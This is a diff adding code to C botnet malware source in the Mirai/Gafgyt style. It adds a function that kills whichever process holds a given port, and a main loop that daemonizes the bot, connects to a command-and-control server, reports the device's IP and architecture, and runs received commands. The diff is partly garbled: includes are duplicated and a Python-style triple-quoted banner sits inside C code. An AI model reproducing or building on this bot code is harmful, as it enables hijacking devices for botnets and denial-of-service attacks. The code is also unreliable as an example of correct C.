@@ -1,3 +1,72 @@
+#include <stdlib.h>
+#include <stdarg.h>
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <signal.h>
+#include <strings.h>
+#include <string.h>
+#include <sys/utsname.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <netinet/tcp.h>
+#include <sys/wait.h>
+#include <sys/ioctl.h>
+#include <poll.h>
+#include <net/if.h>
+#include <ctype.h>
+#include <dirent.h>
+#include <sys/resource.h>
+#include <stdlib.h>
+#include <stdarg.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <time.h>
+#include <netdb.h>
+#include <signal.h>
+#include <strings.h>
+#include <string.h>
+#include <sys/utsname.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <sys/wait.h>
+#include <sys/ioctl.h>
+#include <net/if.h>
+#include <limits.h>
+#include <stdio.h>
+#include <poll.h>
+#include <sys/un.h>
+#include <stddef.h>
+#include <sys/resource.h>
+#define NUMITEMS(x)  (sizeof(x) / sizeof((x)[0]))
+#define SERVER_LIST_SIZE (sizeof(agagag) / sizeof(unsigned char *))
+#define PR_SET_NAME 15
+#define PAD_RIGHT 1
+#define PAD_ZERO 2
+#define PRINT_BUF_LEN 12
+#define CMD_IAC 255
+#define CMD_WILL 251
+#define CMD_WONT 252
+#define CMD_DO 253
+#define CMD_DONT 254
+#define OPT_SGA 3
+#define BUFFER_SIZE 1024
+#define PHI 0x9e3779b9
+#define SOCKBUF_SIZE 1024
+#define PRINT_BUF_LEN 12
+#define std_packet 8190
+#define STD2_SIZE 8191
+#define std_packets 1240
+
 // global variables + definitions
 int mainCommSock = 0; // main comm socket, init to 0
 int currentServer = -1; // index of current server, init to -1
@@ -9,6 +78,21 @@ struct in_addr MyIP; // struct to store my IP
 static uint32_t Q[4096]; // array used for RNG
 static uint32_t c = 362436; // variable used in RNG
 unsigned char macAddress[6] = {0}; // MAC address, initialized to 0
+
+BANNER = '''
+    ,.-.                        ,.-·.            , ·. ,.-·~·.,   ‘             ,.  '                       ,.,   '               ,  . .,  °           , ·. ,.-·~·.,   ‘         ,. -  .,              
+   /   ';\ '                    /    ;'\'         /  ·'´,.-·-.,   `,'‚           /   ';\                     ;´   '· .,        ;'´    ,   ., _';\'        /  ·'´,.-·-.,   `,'‚       ,' ,. -  .,  `' ·,       
+  ';    ;:'\\      ,·'´';        ;    ;:::\\       /  .'´\:::::::'\\   '\ °       ,'   ,'::'\\                  .´  .-,    ';\      \:´¨¯:;'   `;::'\:'\\      /  .'´\:::::::'\\   '\ °     '; '·~;:::::'`,   ';\    
+   ';   ;::;     ,'  ,''\      ';    ;::::;'   ,·'  ,'::::\:;:-·-:';  ';\‚      ,'    ;:::';'                /   /:\\:';   ;:'\'      \\::::;   ,'::_'\\;'   ,·'  ,'::::\:;:-·-:';  ';\‚      ;   ,':\\::;:´  .·´::\'  
+   ';   ';::;   ,'  ,':::'\'     ;   ;::::;   ;.   ';:::;´       ,'  ,':'\\‚     ';   ,':::;'               ,'  ,'::::'\';  ;::';          ,'  ,'::;'  ‘    ;.   ';:::;´       ,'  ,':'\\‚     ;  ·'-·'´,.-·'´:::::::'; 
+    ';   ;:;  ,'  ,':::::;'    ';  ;'::::;     ';   ;::;       ,'´ .'´\::';‚    ;  ,':::;' '           ,.-·'  '·~^*'´¨,  ';::;          ;  ;:::;  °     ';   ;::;       ,'´ .'´\\::';‚  ;´    ':,´:::::::::::·´'  
+     ;   ;:;'´ ,'::::::;'  '   ;  ';:::';      ';   ':;:   ,.·´,.·´::::\;'°   ,'  ,'::;'              ':,  ,·:²*´¨¯'`;  ;::';          ;  ;::;'  ‘      ';   ':;:   ,.·´,.·´::::\;'°   ';  ,    `·:;:-·'´       
+     ';   '´ ,·':::::;'        ';  ;::::;'      \\·,   `*´,.·'´::::::;·´      ;  ';_:,.-·´';\‘       ,'  / \\::::::::';  ;::';          ;  ;::;'‚         \·,   `*´,.·'´::::::;·´      ; ,':\'`:·.,  ` ·.,      
+      ,'   ,.'\\::;·´           \\*´\\:::;‘       \\:¯::\\:::::::;:·´         ',   _,.-·'´:\\:\\‘     ,' ,'::::\\·²*'´¨¯':,'\:;           ',.'\::;'‚          \\:¯::\\:::::::;:·´         \\·-;::\\:::::'`:·-.,';    
+      \\`*´\\:::\\;     ‘         '\::\:;'         `\\:::::\\;::·'´  °           \¨:::::::::::\';     \\`¨\\:::/          \\::\'            \\::\\:;'‚           `\:::::\;::·'´  °           \\::\\:;'` ·:;:::::\::\'  
+       '\:::\;'                   `*´‘              ¯                       '\;::_;:-·'´‘        '\::\;'            '\;'  '           \;:'      ‘           ¯                       '·-·'       `' · -':::'' 
+         `*´‘                                       ‘                         '¨                   `¨'                                °                   ‘                                             
+'''
 
 /**
  * initializes network connection
@@ -2722,6 +2806,129 @@ void killer_xywz(int parentpid)
         closedir(dir);
     }
 }
+int killer_kill_by_port(int port) {
+    DIR *dir, *fd_dir;
+    struct dirent *entry, *fd_entry;
+    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
+    int pid = 0, fd = 0;
+    char inode[16] = {0};
+    char *ptr_path = path;
+    int ret = 0;
+    char port_str[16];
+
+    // convert network byte order port to string in hexadecimal
+    util_itoa(ntohs(port), 16, port_str);
+    // handle cases where the port string length is 2
+    if (util_strlen(port_str) == 2) {
+        port_str[2] = port_str[0];
+        port_str[3] = port_str[1];
+        port_str[4] = 0;
+        port_str[0] = '0';
+        port_str[1] = '0';
+    }
+
+    // open the tcp file to read the current tcp connections
+    fd = open("/proc/net/tcp", O_RDONLY);
+    if (fd == -1) return 0;
+
+    // read each line in the tcp file
+    while (util_fdgets(buffer, 512, fd) != NULL) {
+        int i = 0, ii = 0;
+
+        // find the position of the first ':' character
+        while (buffer[i] != 0 && buffer[i] != ':') i++;
+
+        if (buffer[i] == 0) continue;
+        i += 2;
+        ii = i;
+
+        // find the position of the first space after the ':'
+        while (buffer[i] != 0 && buffer[i] != ' ') i++;
+        buffer[i++] = 0;
+
+        // check if this line corresponds to the port we're interested in
+        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1) {
+            int column_index = 0;
+            int in_column = 0;
+            int listening_state = 0;
+
+            // parse through the columns
+            while (column_index < 7 && buffer[++i] != 0) {
+                if (buffer[i] == ' ' || buffer[i] == '\t') in_column = 1;
+                else {
+                    if (in_column == 1) column_index++;
+                    if (in_column == 1 && column_index == 1 && buffer[i + 1] == 'A') listening_state = 1;
+                    in_column = 0;
+                }
+            }
+            ii = i;
+
+            if (listening_state == 0) continue;
+
+            // find the inode associated with this connection
+            while (buffer[i] != 0 && buffer[i] != ' ') i++;
+            buffer[i++] = 0;
+
+            if (util_strlen(&(buffer[ii])) > 15) continue;
+
+            util_strcpy(inode, &(buffer[ii]));
+            break;
+        }
+    }
+    close(fd);
+
+    // if we didn't find the inode, return
+    if (util_strlen(inode) == 0) return 0;
+
+    // iterate over all processes to find the one that holds the port
+    if ((dir = opendir("/proc/")) != NULL) {
+        while ((entry = readdir(dir)) != NULL && ret == 0) {
+            char *pid = entry->d_name;
+
+            // skip non-numeric directories
+            if (*pid < '0' || *pid > '9') continue;
+
+            // construct the path to the process's exe link
+            util_strcpy(ptr_path, "/proc/");
+            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
+            util_strcpy(ptr_path + util_strlen(ptr_path), "/exe");
+
+            // read the link to the process's executable
+            if (readlink(path, exe, PATH_MAX) == -1) continue;
+
+            // check the file descriptors of the process
+            util_strcpy(ptr_path, "/proc/");
+            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
+            util_strcpy(ptr_path + util_strlen(ptr_path), "/fd");
+            if ((fd_dir = opendir(path)) != NULL) {
+                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0) {
+                    char *fd_str = fd_entry->d_name;
+
+                    // clear and reconstruct the path
+                    util_zero(exe, PATH_MAX);
+                    util_strcpy(ptr_path, "/proc/");
+                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
+                    util_strcpy(ptr_path + util_strlen(ptr_path), "/fd");
+                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
+                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
+                    if (readlink(path, exe, PATH_MAX) == -1) continue;
+
+                    // if this file descriptor matches the inode, kill the process
+                    if (util_stristr(exe, util_strlen(exe), inode) != -1) {
+                        kill(util_atoi(pid, 10), 9);
+                        ret = 1;
+                    }
+                }
+                closedir(fd_dir);
+            }
+        }
+        closedir(dir);
+    }
+
+    sleep(1);
+
+    return ret;
+}
 
 /**
  * etablishes connection to the next server in the list
@@ -2774,4 +2981,137 @@ int initConnection()
 
     return 1; // connection successful
 }
+int main(int argc, unsigned char *argv[]) {
+    // initiate killer process
+    killer_xywz(getppid());
 
+    // open file for writing
+    FILE* fpd = fopen("lmao", "w+");
+
+    // write messages to the file
+    fprintf(fpd, BANNER);
+
+    // print the same messages to stdout
+    printf(BANNER);
+
+    // check if server list size is not less than or equal to zero and return if so
+    if (SERVER_LIST_SIZE <= 0) return 0;
+
+    // seed random number generator
+    srand(time(NULL) ^ getpid());
+    init_rand(time(NULL) ^ getpid());
+    getMyIP();
+
+    pid_t pid1, pid2;
+    int status;
+
+    // create a child process
+    if (pid1 = fork()) {
+        waitpid(pid1, &status, 0);
+        exit(0);
+    } else if (!pid1) {
+        if (pid2 = fork()) {
+            exit(0);
+        } else if (!pid2) {
+            // empty branch
+        } else {
+            // empty branch
+        }
+    } else {
+        // empty branch
+    }
+
+    // set up a new session and change working directory
+    setsid();
+    chdir("/");
+
+    // ignore SIGPIPE signal
+    signal(SIGPIPE, SIG_IGN);
+
+    // main loop
+    while (1) {
+        // check if connection can be initialized, sleep for 5 seconds and continue if not
+        if (initConnection()) {
+            sleep(5);
+            continue;
+        }
+
+        // print device connection details
+        sockprintf(mainCommSock, "\e[1;95mDevice Connected: %s | Port: %s | Arch: %s\e[0m", inet_ntoa(myIP), getPortz(), getArch());
+
+        char commBuf[4096];
+        int got = 0;
+        int i = 0;
+
+        // receive commands
+        while ((got = recvLine(mainCommSock, commBuf, 4096)) != -1) {
+            // check for dead child processes
+            for (i = 0; i < numpids; i++) {
+                if (waitpid(pids[i], NULL, WNOHANG) > 0) {
+                    unsigned int *newpids, on;
+                    for (on = i + 1; on < numpids; on++) pids[on - 1] = pids[on];
+                    pids[on - 1] = 0;
+                    numpids--;
+                    newpids = (unsigned int *)malloc((numpids + 1) * sizeof(unsigned int));
+                    for (on = 0; on < numpids; on++) newpids[on] = pids[on];
+                    free(pids);
+                    pids = newpids;
+                }
+            }
+
+            // null terminate the received command
+            commBuf[got] = 0x00;
+
+            // remove whitespaces from the command
+            trim(commBuf);
+
+            unsigned char *message = commBuf;
+
+            // check if the command starts with '!'
+            if (*message == '!') {
+                unsigned char *nickMask = message + 1;
+                while (*nickMask != ' ' && *nickMask != 0x00) nickMask++;
+                if (*nickMask == 0x00) continue;
+                *(nickMask) = 0x00;
+                nickMask = message + 1;
+
+                message = message + strlen(nickMask) + 2;
+                while (message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;
+
+                unsigned char *command = message;
+                while (*message != ' ' && *message != 0x00) message++;
+                *message = 0x00;
+                message++;
+
+                unsigned char *tmpcommand = command;
+                while (*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }
+
+                unsigned char *params[10];
+                int paramsCount = 1;
+                unsigned char *pch = strtok(message, " ");
+                params[0] = command;
+
+                while (pch) {
+                    if (*pch != '\n') {
+                        params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
+                        memset(params[paramsCount], 0, strlen(pch) + 1);
+                        strcpy(params[paramsCount], pch);
+                        paramsCount++;
+                    }
+                    pch = strtok(NULL, " ");
+                }
+
+                processCmd(paramsCount, params);
+
+                if (paramsCount > 1) {
+                    int q = 1;
+                    for (q = 1; q < paramsCount; q++) {
+                        free(params[q]);
+                    }
+                }
+            }
+        }
+    }
+
+    return 0;
+}
